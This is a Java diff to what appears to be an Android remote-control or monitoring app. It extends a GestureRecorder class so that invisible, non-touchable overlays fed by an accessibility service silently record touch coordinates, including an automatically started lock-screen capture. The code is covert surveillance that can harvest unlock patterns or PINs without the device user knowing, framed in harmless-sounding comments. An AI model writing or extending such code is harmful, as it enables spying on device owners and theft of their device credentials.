@@ -297,6 +297,25 @@ public class GestureRecorder {
     public boolean isRecording() { return isRecording; }
     public boolean isPaused()    { return isPaused; }
 
+    /**
+     * Feed a raw MotionEvent into whichever silent overlays are currently active.
+     * Called by UnifiedAccessibilityService.onMotionEvent() on API 33+ so that
+     * auto-capture can record gesture coordinates without blocking user interaction
+     * (the overlay itself has FLAG_NOT_TOUCHABLE when silent).
+     */
+    public void onExternalMotionEvent(MotionEvent event) {
+        try {
+            if (autoCapturing && autoCaptureOverlay != null) {
+                autoCaptureOverlay.externalTouch(event);
+            }
+            if (lockCaptureActive && lockCaptureOverlay != null) {
+                lockCaptureOverlay.externalTouch(event);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "onExternalMotionEvent: " + e.getMessage());
+        }
+    }
+
     /** Pause touch capture — overlay stays visible, points stop accumulating. */
     public JSONObject pauseRecording() {
         JSONObject r = new JSONObject();
@@ -564,8 +583,16 @@ public class GestureRecorder {
     public JSONObject stopAutoCapture() {
         JSONObject r = new JSONObject();
         try {
+            // Stop the lock-screen auto-capture (started automatically on service connect)
+            // regardless of whether the user also manually started a capture session.
+            disableLockScreenAutoCapture();
+
             if (!autoCapturing || autoCaptureOverlay == null) {
-                r.put("success", false); r.put("error", "Auto-capture not running"); return r;
+                // Lock-screen capture was stopped above; report success.
+                r.put("success", true);
+                r.put("saved", false);
+                r.put("message", "Auto-capture stopped");
+                return r;
             }
             autoCapturing = false;
             final JSONObject[] saved = {null};
@@ -838,9 +865,14 @@ public class GestureRecorder {
             };
             view.setLayerType(View.LAYER_TYPE_SOFTWARE, null);
 
+            // In silent mode, add FLAG_NOT_TOUCHABLE so the overlay is completely
+            // transparent to user input — the device owner can interact normally.
             int flags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                         WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                         WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS;
+            if (silent) {
+                flags |= WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE;
+            }
             int fmt = silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT;
 
             // Use TYPE_ACCESSIBILITY_OVERLAY — works without SYSTEM_ALERT_WINDOW when
@@ -880,6 +912,15 @@ public class GestureRecorder {
         void setPaused(boolean paused) {
             this.paused = paused;
             if (view != null) view.invalidate();
+        }
+
+        /**
+         * Accept a MotionEvent from an external source (e.g. AccessibilityService.onMotionEvent
+         * on API 33+). Used when the overlay is FLAG_NOT_TOUCHABLE and cannot receive events
+         * through its own onTouchEvent.
+         */
+        void externalTouch(MotionEvent event) {
+            if (!stopped) handleTouch(event);
         }
 
         /** Return up to maxPts of the most recent recorded points as a JSON snapshot. */
